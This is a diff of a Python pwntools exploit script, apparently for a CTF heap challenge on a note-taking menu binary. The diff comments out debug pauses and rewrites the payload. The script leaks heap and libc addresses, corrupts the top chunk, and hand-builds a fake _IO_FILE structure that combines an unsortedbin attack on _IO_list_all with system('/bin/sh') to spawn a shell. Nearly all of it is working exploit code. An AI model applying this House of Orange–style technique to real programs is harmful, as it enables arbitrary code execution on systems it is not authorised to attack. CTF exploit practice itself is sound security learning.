@@ -52,20 +52,19 @@ ru(b'you~: ')
 heap_addr=rl().strip()
 heap_addr=int(heap_addr,16)
 print("heap_addr",hex(heap_addr))
-pause()
+# pause()
 add(0x10,b'aaaa') #0
-pause()
+# pause()
 payload1=b'a'*0x10+p64(0)+p8(0xb1)+p8(0x00)+p8(0x00)+p8(0x00)
 edit(0,len(payload1),payload1)
 print("edited")
-pause()
+# pause()
 add(0xb0,b'bbbb') #0
 print("added")
-gdba()
-pause()
+# pause()
 edit(0,0x30,b'a'*0x20)
 print('a*20')
-pause()
+# pause()
 show(0)
 p.recvuntil(b'a'*0x20)
 libc_addr=uu64(p.recv(6))
@@ -79,18 +78,17 @@ system_addr=libc_base+libc.sym['system']
 print('system_addr',hex(system_addr))
 # payload2=b'a'*0x10+p64(0)+p64(0x71)+p64(0)+p64(_IO_list_all-0x10)
 
-fake_file  = IO_FILE_plus()
-fake_file._flags  = 0x0068732f6e69622f # /bin/sh
-fake_file._IO_read_ptr  = 0x61  # overwrite old_top_chunk's size
-fake_file._IO_read_base  = _IO_list_all - 0x10  # overwrite old_top_chunk's bk (for unsortedbin attack)
-fake_file._IO_write_base  = 0
-fake_file._IO_write_ptr  = 1
-fake_file._mode  = 0
-fake_file._old_offset  = system_addr
-fake_file.vtable  = heap_addr  # &old_top_chunk[12]
-fake_file.show()
-payload2=b'a'*0x10
-payload2+=str(fake_file).encode()
+fake_file=b''
+fake_file+=b'/bin/sh\x00'+p64(0x61) #old top chunk prev_size & size 同时也是fake file的_flags字段
+fake_file+=p64(0)+p64(_IO_list_all-0x10) #old top chunk fd & bk
+fake_file+=p64(0)+p64(1)#_IO_write_base & _IO_write_ptr
+fake_file+=p64(0)*7
+fake_file+=p64(heap_addr+0xf40)#chain
+fake_file+=p64(0)*13
+fake_file+=p64(heap_addr+0x508+0xb10)
+fake_file+=p64(0)+p64(0)+p64(system_addr)
+payload2=b'\x00'*0x10
+payload2+=fake_file
 # payload2+=p64(0xdeadbeef)+p64(_IO_list_all-0x10)
 # payload2 += p64(0) + p64(1)
 # payload2 = payload2.ljust(0xc0, b'\x00')
@@ -101,6 +99,11 @@ payload2+=str(fake_file).encode()
 
 edit(0,len(payload2),payload2)
 print("prepare to edit")
+print('heapaddr',hex(heap_addr))
+gdba()
 pause()
-add(0x60,b'cccc') #1
+p.recvuntil(b"Your choice :")
+p.sendline(b'1')
+p.recvuntil(b"Length of Note : ")
+p.sendline(str(0x60).encode())
 ita()
